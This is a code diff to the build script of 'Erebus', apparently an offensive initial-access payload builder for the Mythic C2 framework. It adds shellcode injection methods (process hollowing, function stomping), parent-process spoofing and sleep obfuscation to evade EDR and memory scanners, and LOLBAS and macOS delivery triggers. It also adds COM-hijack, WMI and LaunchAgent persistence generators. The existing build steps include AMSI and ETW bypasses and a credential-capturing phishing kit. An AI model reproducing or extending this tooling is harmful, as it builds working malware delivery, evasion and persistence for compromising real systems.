@@ -74,6 +74,17 @@ _REQUIRED_PLUGIN_FUNCTIONS = [
     "create_applescript_trigger",
     "create_command_trigger",
     "create_pkg_trigger",
+    "create_appbundle_trigger",
+    "create_dmg_trigger",
+    # LOLBAS triggers
+    "create_cmstp_trigger",
+    "create_regsvr32_trigger",
+    "create_xsl_trigger",
+    "create_installutil_trigger",
+    # Standalone persistence plugins
+    "create_com_hijack_dropper",
+    "create_wmi_subscription",
+    "create_launchagent",
 ]
 _missing = [n for n in _REQUIRED_PLUGIN_FUNCTIONS if n not in globals()]
 if _missing:
@@ -325,7 +336,7 @@ DEFAULT_BLOCKED_PROCESSES = [
 class ErebusWrapper(PayloadType):
     name = "erebus_wrapper"
     author = "@Lavender-exe, @hunterino-sec"
-    semver = "0.1.0"
+    semver = "0.1.2"
     
     note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"
 
@@ -339,7 +350,8 @@ class ErebusWrapper(PayloadType):
     wrapper = True
     wrapped_payloads = ["merlin", "kharon", "ceos"
                         "sliver", "apollo", "athena",
-                        "xenon", "nimplant", "hannibal"]
+                        "xenon", "nimplant", "hannibal",
+                        "starburst"]
     c2_profiles = []
 
     # Plugin validation flag - run only once at startup
@@ -605,8 +617,10 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
 6 = ModuleStomp (Self)
 7 = KernelCallbackTable (Self)
 8 = TxfHollow (Remote)
-9 = TpJobObjectApc - RemoteTpJobDirectInsertion (Remote)""",
-            choices = ["1", "2", "3", "4", "5", "6", "7", "8", "9"],
+9 = TpJobObjectApc - RemoteTpJobDirectInsertion (Remote)
+10 = ProcessHollow - Unmap+remap target image (Remote) [T1055.012]
+11 = FunctionStomp - Overwrite ntdll export prologue with JMP trampoline (Self) [T1055]""",
+            choices = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11"],
             default_value = "3",
             hide_conditions = [
                 HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
@@ -908,8 +922,50 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
                 HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="11"),
                 HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
             ]
+        ),
+
+        # PPID Spoofing Configuration
+        BuildParameter(
+            name="0.5 PPID Spoof",
+            group_name="2 - Windows Loader",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Spoof the parent process ID when spawning the target process (T1134.004).\n"
+                "The process tree in Task Manager and EDR telemetry will show the spoofed\n"
+                "parent as the creator instead of the actual loader process.\n"
+                "Only effective for remote injection types that spawn a new process (1, 3, 5, 8, 10)."
+            ),
+            default_value=False,
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="VM Loader"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="2"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="4"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="6"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="7"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="9"),
+                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="11"),
+            ],
+        ),
+
+        BuildParameter(
+            name="0.5 PPID Spoof Target",
+            group_name="2 - Windows Loader",
+            parameter_type=BuildParameterType.ChooseOne,
+            description=(
+                "Process whose PID is used as the spoofed parent.\n"
+                "The loader will find a running instance of this process by name hash\n"
+                "and open it with PROCESS_CREATE_PROCESS rights."
+            ),
+            choices=["explorer.exe", "svchost.exe", "RuntimeBroker.exe", "sihost.exe", "winlogon.exe"],
+            default_value="explorer.exe",
+            hide_conditions=[
+                HideCondition(name="0.0 Target OS", operand=HideConditionOperand.NotEQ, value="Windows"),
+                HideCondition(name="0.5 PPID Spoof", operand=HideConditionOperand.EQ, value=False),
+            ],
         ),
 
         # Guardrails Configuration
@@ -1209,9 +1265,11 @@ NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Lo
                 "Ekko-lite: Timer + XOR-encrypt non-.text PE sections during wait (hides shellcode from memory scanners).\n"
                 "Exhaustion: Fibonacci burn + 100k CloseHandle API hammering + 100 MB memory touch, then WaitableTimer wait. "
                 "Exhausts emulator instruction/syscall budgets so automated sandboxes time out before behaviour is recorded. "
-                "Recommended base dwell: 90000 ms (90 seconds)."
+                "Recommended base dwell: 90000 ms (90 seconds).\n"
+                "Full Ekko: Ekko-lite + XOR stack return addresses in-place + wipe PE DOS/NT headers during wait. "
+                "Defeats stack-walk based memory scanners and PE header signature checks."
             ),
-            choices = ["None", "Timer", "Ekko-lite", "Exhaustion"],
+            choices = ["None", "Timer", "Ekko-lite", "Exhaustion", "Full Ekko"],
             default_value = "None",
             required = False,
             hide_conditions = [
@@ -1379,7 +1437,7 @@ appdomain (self)""",
             group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
-            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode", "OneNote"],
+            choices=["LNK", "BAT", "MSI", "MSC", "HTML", "ClickFix", "HTA", "URL", "JS", "CHM", "SVG", "HTML-Encrypted", "HTML-Geofenced", "SearchMS", "UDL", "QR", "AppDomain", "VSCode", "OneNote", "CMSTP", "Regsvr32", "XSL", "InstallUtil"],
             default_value="BAT",
             required=False,
             hide_conditions = [
@@ -1407,7 +1465,7 @@ appdomain (self)""",
             group_name="11 - Triggers",
             parameter_type=BuildParameterType.ChooseOne,
             description="Trigger delivery mechanism for macOS targets.",
-            choices=["Command", "AppleScript", "PKG", "HTML", "QR"],
+            choices=["Command", "AppleScript", "PKG", "AppBundle", "AppBundle-AdHoc", "DMG", "HTML", "QR"],
             default_value="Command",
             required=False,
             hide_conditions=[
@@ -2390,10 +2448,10 @@ generated if none have been entered.""",
             group_name="16 - Containers",
             parameter_type = BuildParameterType.File,
             description = (
-                "Optional ZIP containing a pre-built payload and/or DLL to use instead of\n"
-                "the Mythic-compiled loader. The archive must contain erebus.exe, erebus.dll,\n"
-                "and/or erebus.xll at its root. Files are extracted directly into payload/\n"
-                "before containerisation, replacing any compiled output."
+                "Optional ZIP whose entire contents are extracted into payload/ before\n"
+                "containerisation. Use this to supply a pre-built payload directory (any\n"
+                "filenames accepted). Extracted files replace any compiled output with the\n"
+                "same name. Directory structure inside the ZIP is preserved."
             ),
             required = False,
             hide_conditions = [
@@ -3182,6 +3240,54 @@ generated if none have been entered.""",
             ]
         ),
 
+        # ── Standalone Persistence ──────────────────────────────────────────────
+        BuildParameter(
+            name="10.0 Standalone Persistence",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.Boolean,
+            description=(
+                "Generate standalone persistence artifacts alongside the payload.\n"
+                "COM Hijacking (Windows, T1546.015): HKCU CLSID override .reg + optional PS1 installer.\n"
+                "WMI Subscription (Windows, T1546.003): PS1 installer + .mof for mofcomp.exe deployment.\n"
+                "LaunchAgent (macOS, T1543.001): XML plist + install/uninstall shell scripts."
+            ),
+            default_value=False,
+            required=False,
+        ),
+        BuildParameter(
+            name="10.1 Persistence Method",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["COM Hijack", "WMI Subscription", "LaunchAgent"],
+            description=(
+                "Standalone persistence technique to generate artifacts for.\n"
+                "COM Hijack (T1546.015): HKCU CLSID override fires when the COM object is next instantiated.\n"
+                "WMI Subscription (T1546.003): permanent WMI event consumer fires every 30 minutes.\n"
+                "LaunchAgent (T1543.001): macOS user-scope LaunchAgent fires at login and stays resident."
+            ),
+            default_value="COM Hijack",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="10.0 Standalone Persistence", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+        BuildParameter(
+            name="10.2 Persistence Target Binary",
+            group_name="12 - Persistence",
+            parameter_type=BuildParameterType.String,
+            description=(
+                "Full path to the loader binary that the persistence mechanism executes.\n"
+                "COM Hijack / WMI: Windows path (e.g. C:\\ProgramData\\Update\\loader.exe).\n"
+                "LaunchAgent: macOS path (e.g. /Users/user/Library/Application Support/loader).\n"
+                "Leave empty to use the plugin default placeholder."
+            ),
+            default_value="",
+            required=False,
+            hide_conditions=[
+                HideCondition(name="10.0 Standalone Persistence", operand=HideConditionOperand.EQ, value=False),
+            ]
+        ),
+
 ]
 
     build_steps = [
@@ -3235,6 +3341,9 @@ generated if none have been entered.""",
 
         BuildStep(step_name = "[T1566.002] - Phishing Kit",
                   step_description = "Generating phishing page kit with credential capture backend"),
+
+        BuildStep(step_name = "[T1546] - Standalone Persistence",
+                  step_description = "Generating standalone persistence artifacts (COM Hijack / WMI / LaunchAgent)"),
     ]
 
     def calculate_sha256(self, file_path: str) -> str:
@@ -3443,6 +3552,10 @@ generated if none have been entered.""",
                                                 ("T1546",     "Event Triggered Execution")]),
             ("2.0 Trigger Type", "OneNote",   [("T1566.001", "Spearphishing Attachment"),
                                                 ("T1204.002", "User Execution: Malicious File")]),
+            ("0.9 Trigger Type", "CMSTP",     [("T1218.003", "System Binary Proxy Execution: CMSTP")]),
+            ("0.9 Trigger Type", "Regsvr32",  [("T1218.010", "System Binary Proxy Execution: Regsvr32")]),
+            ("0.9 Trigger Type", "XSL",       [("T1220",     "XSL Script Processing")]),
+            ("0.9 Trigger Type", "InstallUtil",[("T1218.004", "System Binary Proxy Execution: InstallUtil")]),
             # Container
             ("3.0 Container Type", "ISO",      [("T1553.005", "Mark-of-the-Web Bypass")]),
             ("3.0 Container Type", "VHD",      [("T1553.005", "Mark-of-the-Web Bypass")]),
@@ -3457,6 +3570,9 @@ generated if none have been entered.""",
             ("0.4 Shellcode Loader - Injection Type", "6", [("T1055.013", "Process Doppelgänging / Module Stomping")]),
             ("0.4 Shellcode Loader - Injection Type", "7", [("T1055",     "KernelCallbackTable Hijack")]),
             ("0.4 Shellcode Loader - Injection Type", "8", [("T1055.012", "Process Hollowing (TxF)")]),
+            ("0.4 Shellcode Loader - Injection Type", "9", [("T1055.015", "ListPlanting / Thread Pool Injection (JobApc)")]),
+            ("0.4 Shellcode Loader - Injection Type", "10", [("T1055.012", "Process Hollowing")]),
+            ("0.4 Shellcode Loader - Injection Type", "11", [("T1055",     "Process Injection: Function Stomping")]),
             # Obfuscation
             ("0.0c Enable Donut", True,        [("T1027.009", "Embedded Payloads (Donut PE→shellcode)")]),
             # Evasion
@@ -3465,6 +3581,10 @@ generated if none have been entered.""",
             ("6.0 Codesign Loader", True,      [("T1553.002", "Code Signing")]),
             # Infra
             ("7.0 Generate Redirector Configs", True, [("T1090.002", "External Proxy / Redirector")]),
+            # Standalone Persistence
+            ("10.1 Persistence Method", "COM Hijack",       [("T1546.015", "Event Triggered Execution: COM Hijacking")]),
+            ("10.1 Persistence Method", "WMI Subscription", [("T1546.003", "Event Triggered Execution: WMI Event Subscription")]),
+            ("10.1 Persistence Method", "LaunchAgent",      [("T1543.001", "Create or Modify System Process: Launch Agent")]),
             # Maldoc
             ("0.9 Create MalDoc", "Excel (XLSM)",  [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
             ("0.9 Create MalDoc", "VBA",            [("T1566.001", "Spearphishing Attachment"), ("T1137.001", "Office Template Macros")]),
@@ -3971,8 +4091,8 @@ generated if none have been entered.""",
                 )
 
             case "Electron":
-                # Optional pre-built payload zip: extract erebus.{exe,dll,xll}
-                # into payload/ before containerisation, replacing compiled output.
+                # Optional pre-built payload zip: extract all contents into
+                # payload/ before containerisation, replacing compiled output.
                 payload_zip_uuid = self.get_parameter("3.E6b Electron Payload Zip")
                 if payload_zip_uuid:
                     zip_resp = await SendMythicRPCFileGetContent(
@@ -3982,18 +4102,20 @@ generated if none have been entered.""",
                         raise RuntimeError("Failed to retrieve 3.E6b Electron Payload Zip from Mythic.")
                     _payload_dir = Path(agent_build_path) / "payload"
                     _payload_dir.mkdir(parents=True, exist_ok=True)
-                    allowed = {"erebus.exe", "erebus.dll", "erebus.xll"}
                     with zipfile.ZipFile(io.BytesIO(zip_resp.Content)) as zf:
                         extracted = []
                         for member in zf.namelist():
-                            basename = Path(member).name
-                            if basename in allowed:
-                                (_payload_dir / basename).write_bytes(zf.read(member))
-                                extracted.append(basename)
+                            # Skip directory entries and guard against zip-slip
+                            if member.endswith("/"):
+                                continue
+                            member_path = (_payload_dir / member).resolve()
+                            if not str(member_path).startswith(str(_payload_dir.resolve())):
+                                continue
+                            member_path.parent.mkdir(parents=True, exist_ok=True)
+                            member_path.write_bytes(zf.read(member))
+                            extracted.append(member)
                     if not extracted:
-                        raise RuntimeError(
-                            "3.E6b Electron Payload Zip contained no erebus.{exe,dll,xll}."
-                        )
+                        raise RuntimeError("3.E6b Electron Payload Zip was empty or contained no files.")
 
                 # Optional operator-supplied icon (PNG). Fetched from Mythic
                 # by file UUID when set; falls back to the vendored Erebus.png.
@@ -4279,17 +4401,20 @@ generated if none have been entered.""",
             encryption_type_value = encryption_type_map.get(self.get_parameter("2.1 Encryption Type"), 0)
             encryption_key_bytes = "0x00"
             encryption_iv_bytes = ", ".join(["0x00"] * 16)
+            mz_pe_mode = False
             if not donut_enabled:
                 with open(str(mythic_shellcode_path), "rb") as f:
                     header = f.read(2)
                     if header == b"\x4d\x5a":
-                        await self._fail_step(response, "[T1027] - Header Check",
-                            "Supplied payload is a PE instead of raw shellcode.",
-                            "Found leading MZ header - supplied file was not shellcode")
-                        return response
-                response.status = BuildStatus.Success
-                response.build_message = "No leading MZ header found in payload."
-                await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
+                        mz_pe_mode = True
+                        shutil.copy(src=str(mythic_shellcode_path), dst=str(obfuscated_shellcode_path))
+                        await self._build_step("[T1027] - Header Check",
+                            "MZ header detected - PE will be used directly, skipping obfuscation and loader compilation",
+                            success=True)
+                    else:
+                        response.status = BuildStatus.Success
+                        response.build_message = "No leading MZ header found in payload."
+                        await self._build_step("[T1027] - Header Check", "No leading MZ header found in payload", success=True)
 
             # R2a: command construction lives in plugin_shellcode_obfuscation
             # (pure function in archive/shellcode_obfuscation.py). The async
@@ -4311,17 +4436,18 @@ generated if none have been entered.""",
                 encryption_key=_key,
             )
 
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, stderr = await process.communicate()
+            if not mz_pe_mode:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
+                )
+                stdout, stderr = await process.communicate()
 
-            if stdout:
-                output += f"[stdout]\n{stdout.decode()}"
-            if stderr:
-                output += f"[stderr]\n{stderr.decode()}"
+                if stdout:
+                    output += f"[stdout]\n{stdout.decode()}"
+                if stderr:
+                    output += f"[stderr]\n{stderr.decode()}"
 
             if os.path.exists(obfuscated_shellcode_path):
                 # Parse key/IV directly out of the C source shellcrypt
@@ -4404,7 +4530,7 @@ generated if none have been entered.""",
                         )
                     output += f"[DEBUG] Wrote {len(_raw)} raw bytes to {mac_shellcode_h}\n"
 
-                if self.get_parameter("2.4 Shellcode Format") == "Raw":
+                if not mz_pe_mode and self.get_parameter("2.4 Shellcode Format") == "Raw":
                     # Raw format: re-run shellcrypt in C mode and slice the
                     # `unsigned char key[] = {...};` declaration out of
                     # stdout so the loader can compile it in directly.
@@ -4439,14 +4565,14 @@ generated if none have been entered.""",
                     response.build_message = "Shellcode Generated!"
                     await self._build_step("[T1027] - Shellcode Obfuscation", "Obfuscated Shellcode - Continuing to Next Step", success=True)
 
-            elif process.returncode != 0:
+            elif not mz_pe_mode and process.returncode != 0:
                 response.payload = b""
                 await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
                 response.build_message = "Failed to obfuscate shellcode."
                 response.build_stderr = output + "\n" + obfuscated_shellcode_path
                 return response
 
-            else:
+            elif not mz_pe_mode:
                 response.payload = b""
                 response.status = BuildStatus.Error
                 await self._build_step("[T1027] - Shellcode Obfuscation", "Failed to obfuscate shellcode", success=False)
@@ -4600,7 +4726,7 @@ generated if none have been entered.""",
                                 parse_csv(self.get_parameter("0.5o Callstack Spoof Modules"))
                                 or ["ntdll.dll", "kernel32.dll", "kernelbase.dll"]
                             ),
-                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                            sleep_obfuscation_type={"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                                 self.get_parameter("0.5p Sleep Obfuscation"), 0),
                             sleep_obfuscation_base_ms=int(self.get_parameter("0.5q Sleep Base MS") or 5000),
                             sleep_obfuscation_jitter_ms=int(self.get_parameter("0.5r Sleep Jitter MS") or 3000),
@@ -4895,13 +5021,15 @@ generated if none have been entered.""",
                         _hash_seed = f"0x{secrets.randbits(32):08X}"
                         _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
                         _cs  = 1 if self.get_parameter("0.5n Callstack Spoofing") else 0
-                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                        _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                             self.get_parameter("0.5p Sleep Obfuscation"), 0)
                         _so_base = int(self.get_parameter("0.5q Sleep Base MS") or 5000)
                         _so_jitt = int(self.get_parameter("0.5r Sleep Jitter MS") or 3000)
                         _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
                         _etw     = int(self.get_parameter("0.5t ETW Bypass Type") or 1)
                         _unhook  = int(self.get_parameter("0.5u Unhook Scope") or 1)
+                        _ppid_spoof = 1 if self.get_parameter("0.5 PPID Spoof") else 0
+                        _ppid_target = str(self.get_parameter("0.5 PPID Spoof Target") or "explorer.exe")
                         cmd = [
                             "make",
                             "-C",
@@ -4919,6 +5047,8 @@ generated if none have been entered.""",
                             f"CONFIG_AMSI_BYPASS_TYPE={_amsi}",
                             f"CONFIG_ETW_BYPASS_TYPE={_etw}",
                             f"CONFIG_UNHOOK_SCOPE={_unhook}",
+                            f"CONFIG_PPID_SPOOF={_ppid_spoof}",
+                            f"CONFIG_PPID_SPOOF_TARGET={_ppid_target}",
                             "all"
                         ]
                         if loader_format == "dll":
@@ -4972,9 +5102,9 @@ generated if none have been entered.""",
                                         cmd.insert(-1, "CONFIG_XLL_FILE_INGESTOR_ENABLED=1")
                                         output += f"[+] XLL ingest file embedded: {_ingest_fname} ({len(_ingest_bytes)} bytes)\n"
                                     else:
-                                        output += "[WARN] Failed to retrieve XLL ingest file content — ingestor disabled.\n"
+                                        output += "[WARN] Failed to retrieve XLL ingest file content - ingestor disabled.\n"
                                 except Exception as _ie:
-                                    output += f"[WARN] XLL ingest file error: {_ie} — ingestor disabled.\n"
+                                    output += f"[WARN] XLL ingest file error: {_ie} - ingestor disabled.\n"
                         else:
                             compile_step_name = "[T1027] - Compiling Shellcode Loader"
                             compile_step_msg = "Shellcode Loader Compiled!"
@@ -5004,7 +5134,7 @@ generated if none have been entered.""",
                     build_config = self.get_parameter('0.3 Loader Build Configuration')
                     _hash_seed = f"0x{secrets.randbits(32):08X}"
                     _sw3 = {"SysWhispers3": 1, "Heaven's Gate": 2}.get(self.get_parameter("0.5m Syscall Backend"), 0)
-                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3}.get(
+                    _so_type = {"None": 0, "Timer": 1, "Ekko-lite": 2, "Exhaustion": 3, "Full Ekko": 4}.get(
                         self.get_parameter("0.5p Sleep Obfuscation"), 0)
                     inj = self.get_parameter('0.4a VM Loader - Injection Type') or "2"
                     _amsi    = int(self.get_parameter("0.5s AMSI Bypass Type") or 1)
@@ -5019,7 +5149,7 @@ generated if none have been entered.""",
                     # VM_KEY_BASE_*: random 6-byte key derivation base.
                     # All values passed to BOTH the embedded build step and the
                     # final compile so vmloader_builder.cpp and vmloader.hpp use
-                    # identical parameters — seed mismatch = corrupted payload.
+                    # identical parameters - seed mismatch = corrupted payload.
                     _vm_seed  = f"0x{secrets.randbits(32):08X}U"
                     import random as _rnd
                     _vm_fwd   = list(range(8))
@@ -5190,142 +5320,251 @@ generated if none have been entered.""",
                 payload_final_name  = f"erebus_mac{_mac_out_ext}"
 
             # Execute compilation
-            process = await asyncio.create_subprocess_exec(
-                *cmd,
-                stdout=asyncio.subprocess.PIPE,
-                stderr=asyncio.subprocess.PIPE,
-            )
-            stdout, stderr = await process.communicate()
-
-            if stdout:
-                output += f"[stdout]\n{stdout.decode(errors='replace')}"
-            if stderr:
-                output += f"[stderr]\n{stderr.decode(errors='replace')}"
-
-            # Handle compilation output
-            if payload_type == "Hijack":
-                payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
-                payload_path = str(payload_path)
-
-                if process.returncode != 0:
-                    response.status = BuildStatus.Error
-                    response.payload = b""
-                    response.build_message = "Failed to compile DLL"
-                    response.build_stderr = output
-                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
-                    return response
-
-                shutil.copy(dst=payload_path, src=payload_output_file)
-
-                # Skip PE sanitize + self-hunt on debug builds - see
-                # _finalize_pe_artifact for the rationale.
-                _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
-                output += _finalize_pe_artifact(
-                    payload_path,
-                    str(PurePath(agent_build_path) / "payload"),
-                    build_config=_hijack_build_config,
+            if mz_pe_mode:
+                # MZ header detected upstream - PE supplied directly, skip compilation.
+                loader_format = self.get_parameter("0.2 Loader Format") or "exe"
+                _pd = Path(agent_build_path) / "payload"
+                _pd.mkdir(parents=True, exist_ok=True)
+                payload_path = str(_pd / f"erebus.{loader_format}")
+                shutil.copy(src=str(mythic_shellcode_path), dst=payload_path)
+                response.status = BuildStatus.Success
+                response.build_message = "MZ PE supplied - skipping loader compilation"
+                await self._build_step(compile_step_name, "MZ PE detected - skipping loader compilation, using PE directly", success=True)
+            else:
+                process = await asyncio.create_subprocess_exec(
+                    *cmd,
+                    stdout=asyncio.subprocess.PIPE,
+                    stderr=asyncio.subprocess.PIPE,
                 )
+                stdout, stderr = await process.communicate()
 
-                if os.path.exists(payload_path):
-                    response.status = BuildStatus.Success
-                    response.build_message = "DLL Compiled!"
-                    response.build_stdout = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, compile_step_msg, success=True)
-                else:
-                    response.status = BuildStatus.Error
-                    response.payload = b""
-                    response.build_message = "Failed to compile DLL"
-                    response.build_stderr = output + "\n" + payload_path
-                    await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
-                    return response
+                if stdout:
+                    output += f"[stdout]\n{stdout.decode(errors='replace')}"
+                if stderr:
+                    output += f"[stderr]\n{stderr.decode(errors='replace')}"
 
-            elif payload_type == "Loader":
-                loader_type = self.get_parameter("0.1 Loader Type")
+                # Handle compilation output
+                if payload_type == "Hijack":
+                    payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                    payload_path = str(payload_path)
 
-                if loader_type == "Shellcode Loader":
-                    build_config = self.get_parameter('0.3 Loader Build Configuration')
+                    if process.returncode != 0:
+                        response.status = BuildStatus.Error
+                        response.payload = b""
+                        response.build_message = "Failed to compile DLL"
+                        response.build_stderr = output
+                        await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
+                        return response
 
-                    # Handle test build - create zip of all test payloads
-                    if build_config == "test":
-                        payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory
+                    shutil.copy(dst=payload_path, src=payload_output_file)
 
-                        output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
-                        output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"
+                    # Skip PE sanitize + self-hunt on debug builds - see
+                    # _finalize_pe_artifact for the rationale.
+                    _hijack_build_config = self.get_parameter("1.0b Hijack Build Configuration") or "release"
+                    output += _finalize_pe_artifact(
+                        payload_path,
+                        str(PurePath(agent_build_path) / "payload"),
+                        build_config=_hijack_build_config,
+                    )
 
-                        if payloads_dir.exists():
-                            files_in_dir = list(payloads_dir.iterdir())
-                            output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"
+                    if os.path.exists(payload_path):
+                        response.status = BuildStatus.Success
+                        response.build_message = "DLL Compiled!"
+                        response.build_stdout = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, compile_step_msg, success=True)
+                    else:
+                        response.status = BuildStatus.Error
+                        response.payload = b""
+                        response.build_message = "Failed to compile DLL"
+                        response.build_stderr = output + "\n" + payload_path
+                        await self._build_step(compile_step_name, "Failed to Compile DLL Payload", success=False)
+                        return response
 
-                        if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
+                elif payload_type == "Loader":
+                    loader_type = self.get_parameter("0.1 Loader Type")
+
+                    if loader_type == "Shellcode Loader":
+                        build_config = self.get_parameter('0.3 Loader Build Configuration')
+
+                        # Handle test build - create zip of all test payloads
+                        if build_config == "test":
+                            payloads_dir = Path(payload_output_file)  # payload_output_file contains path to payloads directory
+
+                            output += f"[DEBUG] Payloads directory: {payloads_dir}\n"
+                            output += f"[DEBUG] Payloads directory exists: {payloads_dir.exists()}\n"
+
+                            if payloads_dir.exists():
+                                files_in_dir = list(payloads_dir.iterdir())
+                                output += f"[DEBUG] Files in payloads directory: {[f.name for f in files_in_dir]}\n"
+
+                            if not payloads_dir.exists() or not any(payloads_dir.iterdir()):
+                                response.status = BuildStatus.Error
+                                response.build_message = "Failed to compile test payloads"
+                                response.build_stderr = output + f"\nPayloads directory not found or empty: {payloads_dir}"
+                                await self._build_step(compile_step_name, "Failed to Compile Test Payloads", success=False)
+                                return response
+
+                            # Create agent_code/payloads directory for persistent storage
+                            agent_code_payloads_dir = Path(__file__).resolve().parent.parent / "agent_code" / "payloads"
+                            agent_code_payloads_dir.mkdir(parents=True, exist_ok=True)
+
+                            # Create zip file using shutil
+                            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                            zip_basename = f"test_payloads_{timestamp}"
+
+                            # Use shutil.make_archive to create zip (it adds .zip automatically)
+                            # This creates the zip in the parent directory of payloads_dir
+                            zip_archive_path = shutil.make_archive(
+                                base_name=str(payloads_dir.parent / zip_basename),
+                                format='zip',
+                                root_dir=str(payloads_dir.parent),
+                                base_dir=payloads_dir.name
+                            )
+
+                            output += f"[DEBUG] Created archive at: {zip_archive_path}\n"
+                            output += f"[DEBUG] Archive size: {os.path.getsize(zip_archive_path)} bytes\n"
+
+                            # Move the zip to agent_code/payloads
+                            final_zip_path = agent_code_payloads_dir / f"{zip_basename}.zip"
+                            shutil.move(zip_archive_path, str(final_zip_path))
+
+                            output += f"[DEBUG] Moved archive to: {final_zip_path}\n"
+
+                            # Also copy individual payloads to agent_code/payloads for easy access
+                            files_copied = 0
+                            for file in payloads_dir.iterdir():
+                                if file.is_file():
+                                    shutil.copy(file, agent_code_payloads_dir / file.name)
+                                    files_copied += 1
+
+                            output += f"[DEBUG] Copied {files_copied} individual files\n"
+
+                            if os.path.exists(final_zip_path) and os.path.getsize(final_zip_path) > 0:
+                                response.status = BuildStatus.Success
+                                response.build_message = f"Test payloads compiled and saved to agent_code/payloads/!"
+                                response.build_stdout = output + f"\nZip: {final_zip_path}\nIndividual files also copied\nContains {files_copied} test payloads"
+                                await self._build_step(compile_step_name, f"{compile_step_msg} Saved {files_copied} payloads to {agent_code_payloads_dir}", success=True)
+
+                                # For test builds, read the zip and return it as the payload
+                                with open(final_zip_path, "rb") as f:
+                                    response.payload = f.read()
+                                response.updated_filename = f"{zip_basename}.zip"
+
+                                # Return early for test builds - skip containerization and other steps
+                                return response
+                            else:
+                                response.status = BuildStatus.Error
+                                response.build_message = f"Failed to create test payload zip"
+                                response.build_stderr = output + "\n" + str(final_zip_path)
+                                await self._build_step(compile_step_name, f"Failed to package test payloads", success=False)
+                                return response
+                        else:
+                            payload_path = PurePath(agent_build_path) / "payload" / payload_final_name
+                            payload_path = str(payload_path)
+                            shutil.copy(dst=payload_path, src=payload_output_file)
+
+                            # build_config was resolved at the top of this
+                            # branch (Shellcode Loader, non-test). Threaded
+                            # into the finalizer so debug builds skip the
+                            # sanitizer/self_hunt pair.
+                            output += _finalize_pe_artifact(
+                                payload_path,
+                                str(PurePath(agent_build_path) / "payload"),
+                                build_config=build_config,
+                            )
+
+                            if os.path.exists(payload_path):
+                                response.status = BuildStatus.Success
+                                response.build_message = "Loader Compiled!"
+                                response.build_stdout = output + "\n" + payload_path
+                                await self._build_step(compile_step_name, compile_step_msg, success=True)
+                            else:
+                                response.status = BuildStatus.Error
+                                response.build_message = "Failed to compile loader"
+                                response.build_stderr = output + "\n" + payload_path
+                                await self._build_step(compile_step_name, "Failed to Compile Shellcode Loader", success=False)
+                                return response
+
+                    elif loader_type == "ClickOnce":
